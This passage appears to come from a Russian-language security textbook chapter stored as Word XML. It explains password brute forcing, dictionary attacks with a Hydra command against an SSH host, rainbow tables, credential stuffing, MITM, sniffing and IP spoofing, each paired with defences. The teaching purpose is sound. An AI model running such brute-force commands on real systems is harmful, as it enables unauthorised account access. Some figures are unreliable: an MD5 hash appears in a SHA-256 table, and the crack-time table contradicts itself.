          <w:b/>
        </w:rPr>
        <w:t>Как работает:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>passwords = ['a', 'b', 'c', ..., 'zzzzz']  # Все комбинации</w:t>
        <w:br/>
        <w:t>for password in passwords:</w:t>
        <w:br/>
        <w:t xml:space="preserve">    if try_login('admin', password):</w:t>
        <w:br/>
        <w:t xml:space="preserve">        print(f"Пароль найден: {password}")</w:t>
        <w:br/>
        <w:t xml:space="preserve">        break</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Сложность</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Пароль `1234` (4 цифры): 10^4 = 10,000 комбинаций → взломают за секунды</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Пароль `Pa$$w0rd` (8 символов, буквы + цифры + спецсимволы): 95^8 = 6.6 квадриллионов комбинаций</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>При скорости 1 миллион попыток/сек: **209 лет**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>При скорости 100 миллиардов попыток/сек (GPU-кластер): **21 час**</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Таблица времени взлома паролей (GPU RTX 4090, 100 млрд/сек)</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>| Длина | Только цифры | Буквы (a-z) | Буквы + цифры | Буквы + цифры + спецсимволы |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>|-------|--------------|-------------|---------------|------------------------------|</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| 4     | 0.0001 сек   | 0.5 сек     | 1 сек         | 3 сек                        |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| 6     | 0.01 сек     | 5 мин       | 30 мин        | 6 часов                      |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| 8     | 1 сек        | 5 дней      | 2 месяца      | 21 час                       |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| 10    | 2 мин        | 3 года      | 200 лет       | 92 года                      |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| 12    | 3 часа       | 2000 лет    | 400,000 лет   | 500,000 лет                  |</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Вывод</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Минимум </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>12 символов</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> с буквами + цифры + спецсимволы. Идеально — </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>16+</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Защита от brute force</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Rate limiting**: блокировка IP после 5 неудачных попыток</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**CAPTCHA** после 3 попыток</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Account lockout**: блокировка аккаунта на 30 минут после 10 попыток</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**MFA** (Multi-Factor Authentication) — даже если пароль подобрали, нужен ещё код из SMS/приложения</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Dictionary Attack (Словарная атака)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Определение</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Перебор паролей из </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>списка популярных паролей</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (словаря).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Откуда берутся словари?</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Утечки баз данных (RockYou 2009: 32 млн паролей)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Топ-1000 популярных паролей</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Слова из словаря (password, qwerty, letmein)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Имена + даты: `john1990`, `maria2000`</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Топ-10 паролей в 2023 году</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (NordPass):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>`123456` (100 млн пользователей)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>`admin`</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>`12345678`</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>`123456789`</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>`1234`</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>`12345`</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>`password`</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>`123`</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>`Aa123456`</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>`1234567890`</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример словарной атаки</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t># Hydra — инструмент для брутфорса SSH</w:t>
        <w:br/>
        <w:t>hydra -l admin -P passwords.txt ssh://192.168.1.10</w:t>
        <w:br/>
        <w:t># -l admin — логин</w:t>
        <w:br/>
        <w:t># -P passwords.txt — словарь паролей (1 млн строк)</w:t>
        <w:br/>
        <w:t># Если пароль "password" в словаре → взломают за минуты</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Защита</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Не используй популярные пароли**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Пароли не должны быть словами из словаря</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Менеджер паролей (генерирует `Kj8$mQ#2vL9pXz` вместо `password123`)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Rainbow Tables (Радужные таблицы)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Определение</w:t>
      </w:r>
      <w:r>
        <w:t>: Предвычисленные таблицы хешей паролей для ускорения взлома.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Как работает:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Обычно пароли хранятся в виде хешей (глава 9.02):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Пароль: password → SHA-256 → 5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Хакер не может расшифровать хеш (SHA-256 — односторонняя функция). Но может </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>перебрать</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> все пароли и сравнить хеши:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>password → хеш 5e8848...</w:t>
        <w:br/>
        <w:t>admin    → хеш 8c6976...</w:t>
        <w:br/>
        <w:t>123456   → хеш e10adc...</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Но это долго. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Rainbow Table</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — это готовая таблица:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>password → 5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8</w:t>
        <w:br/>
        <w:t>admin    → 8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918</w:t>
        <w:br/>
        <w:t>123456   → e10adc3949ba59abbe56e057f20f883e</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Размер rainbow table для всех 8-символьных паролей (буквы+цифры)</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Комбинаций: 62^8 = 218 триллионов</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Размер таблицы: **~7 петабайт** (7000 терабайт)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Защита — соль (Salt)</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>К паролю добавляется случайная строка перед хешированием:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Пароль: password</w:t>
        <w:br/>
        <w:t>Соль (для пользователя 1): x9Kq2mL</w:t>
        <w:br/>
        <w:t>Итоговый хеш: SHA256("password" + "x9Kq2mL") → уникальный хеш</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Даже если у двух пользователей одинаковый пароль `password`, хеши будут разные (из-за разных солей). </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Rainbow table бесполезна</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — для каждого пользователя нужна своя таблица.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Современные алгоритмы с солью</w:t>
      </w:r>
      <w:r>
        <w:t>: bcrypt, Argon2, PBKDF2 (глава 9.02).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Credential Stuffing (Подстановка учётных данных)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Определение</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Использование </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>украденных логинов/паролей</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> с одного сайта для взлома аккаунтов на других сайтах.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Как работает:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Хакер покупает базу утечки с 10 млн email/password (например, утечка LinkedIn 2012)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Автоматически пробует эти пары на других сайтах (Netflix, Gmail, Amazon)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**53% пользователей** используют один и тот же пароль везде → миллионы аккаунтов скомпрометированы</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Реальный пример — Disney+ 2019</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Сразу после запуска Disney+ тысячи аккаунтов взломали</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Причина: пользователи использовали **тот же email/пароль**, что и на других сайтах (которые утекли раньше)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Хакеры продавали доступы к Disney+ по $3 на чёрном рынке</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Защита</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Уникальный пароль для каждого сайта** (менеджер паролей: Bitwarden, 1Password)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Проверь, утекал ли твой пароль: [haveibeenpwned.com](https://haveibeenpwned.com)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>MFA везде, где возможно</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>9.5.3. Сетевые атаки: Когда хакер — твой сосед по Wi-Fi</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Man-in-the-Middle (MITM) — Атака посредника</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Определение</w:t>
      </w:r>
      <w:r>
        <w:t>: Злоумышленник перехватывает трафик между двумя сторонами (клиент ↔ сервер), подслушивает и может модифицировать данные.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Как работает:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Ты      →  [Хакер]  →  Gmail</w:t>
        <w:br/>
        <w:t xml:space="preserve">        ←  [Хакер]  ←</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример — публичный Wi-Fi в кафе</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Ты подключаешься к `Starbucks_WiFi`</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Хакер сидит с ноутбуком и запустил **ARP Spoofing** (обманул роутер, что его MAC-адрес = адрес роутера)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Теперь весь твой трафик идёт через ноутбук хакера</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Ты заходишь на `http://mybank.com` (не HTTPS!) → хакер видит логин/пароль</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Даже если HTTPS, хакер может попытаться **SSL Stripping** (подменить HTTPS на HTTP)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Инструменты для MITM</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Ettercap** — ARP spoofing</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Wireshark** — перехват пакетов</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**mitmproxy** — прокси для перехвата HTTPS</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Реальный пример — Lenovo Superfish (2015)</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Lenovo предустановила на ноутбуки рекламное ПО **Superfish**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Оно перехватывало HTTPS-трафик (устанавливало свой корневой сертификат)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Рекламодатели могли внедрять рекламу даже на зашифрованные страницы</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Но Superfish имел **единый приватный ключ** на всех ноутбуках → хакеры расшифровали его → могли делать MITM на **любом Lenovo с Superfish**</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Защита</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Используй только **HTTPS** (особенно в публичных Wi-Fi)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Установи расширение **HTTPS Everywhere** (автоматически переключает на HTTPS)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**VPN** в публичных сетях (шифрует весь трафик)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Проверяй SSL-сертификаты (если браузер показывает предупреждение — уходи с сайта)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Packet Sniffing (Перехват пакетов)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Определение</w:t>
      </w:r>
      <w:r>
        <w:t>: Прослушивание трафика в сети.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Как работает:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>В Wi-Fi все пакеты передаются по воздуху → можно перехватить (если Wi-Fi без шифрования)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Даже в проводной сети (Ethernet) можно перехватить, если доступ к свитчу</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Инструменты</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Wireshark** — перехват и анализ пакетов</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**tcpdump** — консольный сниффер</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Что можно перехватить:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>HTTP-запросы (логины/пароли)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Email (POP3, IMAP без SSL)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>FTP-логины</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>DNS-запросы (какие сайты посещал пользователь)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Защита</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Шифруй всё** (HTTPS, SSH, VPN)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>WPA3 для Wi-Fi (вместо WPA2 или, боже упаси, WEP)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>IP Spoofing (Подмена IP-адреса)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Определение</w:t>
      </w:r>
      <w:r>
        <w:t>: Подделка исходящего IP-адреса в пакетах.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Зачем:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Скрыть источник атаки</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Обойти файрвол (если он доверяет определённым IP)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>DDoS (Distributed Denial of Service) — усилить атаку</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример — Smurf Attack</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Хакер отправляет **ICMP Echo Request** (ping) на broadcast-адрес сети `192.168.1.255`</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
